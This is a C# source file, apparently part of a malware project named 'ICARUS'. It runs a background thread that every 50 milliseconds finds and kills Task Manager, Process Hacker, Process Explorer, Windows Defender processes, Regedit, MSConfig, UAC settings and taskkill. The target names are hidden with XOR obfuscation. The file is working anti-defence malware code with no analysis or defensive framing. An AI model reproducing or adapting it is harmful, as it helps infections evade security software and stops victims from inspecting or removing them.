using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;

namespace Peg.ICARUS
{
	public static class ProstathsYlhs
	{
		private static Thread BlockThread = new Thread(Block);

		public static bool Enabled { get; set; }

		public static void Arxiko()
		{
			Enabled = true;
			BlockThread.Start();
		}

		[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
		public static void StopBlock()
		{
			Enabled = false;
			try
			{
				BlockThread.Abort();
				BlockThread = new Thread(Block);
			}
			catch
			{
			}
		}

		public static string thebook(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		private static void Block()
		{
			while (Enabled)
			{
				IntPtr intPtr = CreateToolhelp32Snapshot(2u, 0u);
				PROCESSENTRY32 lppe = default(PROCESSENTRY32);
				lppe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
				if (Process32First(intPtr, ref lppe))
				{
					do
					{
						uint th32ProcessID = lppe.th32ProcessID;
						string szExeFile = lppe.szExeFile;
						if (Matches(szExeFile, thebook("^kyagmx$oro")) || Matches(szExeFile, thebook("ZxeioyyBkiaox$oro")) || Matches(szExeFile, thebook("zxeiorz$oro")) || Matches(szExeFile, thebook("GYKYI\u007fc$oro")) || Matches(szExeFile, thebook("GyGzOdm$oro")) || Matches(szExeFile, thebook("Gz_RYx|$oro")) || Matches(szExeFile, thebook("GzIgnX\u007fd$oro")) || Matches(szExeFile, thebook("DcyYx|$oro")) || Matches(szExeFile, thebook("IedlcmYoi\u007fxc~sZefcis$oro")) || Matches(szExeFile, thebook("GYIedlcm$oro")) || Matches(szExeFile, thebook("Xomonc~$oro")) || Matches(szExeFile, thebook("_yoxKiie\u007fd~Ied~xefYo~~cdmy$oro")) || Matches(szExeFile, thebook("~kyaacff$oro")))
						{
							KillProcess(th32ProcessID);
						}
					}
					while (Process32Next(intPtr, ref lppe));
				}
				CloseHandle(intPtr);
				Thread.Sleep(50);
			}
		}

		private static bool Matches(string source, string target)
		{
			return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
		}

		private static void KillProcess(uint processId)
		{
			IntPtr intPtr = OpenProcess(1u, bInheritHandle: false, processId);
			TerminateProcess(intPtr, 0);
			CloseHandle(intPtr);
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

		[DllImport("kernel32.dll")]
		private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		[DllImport("kernel32.dll")]
		private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr handle);

		[DllImport("kernel32.dll")]
		private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);
	}
}
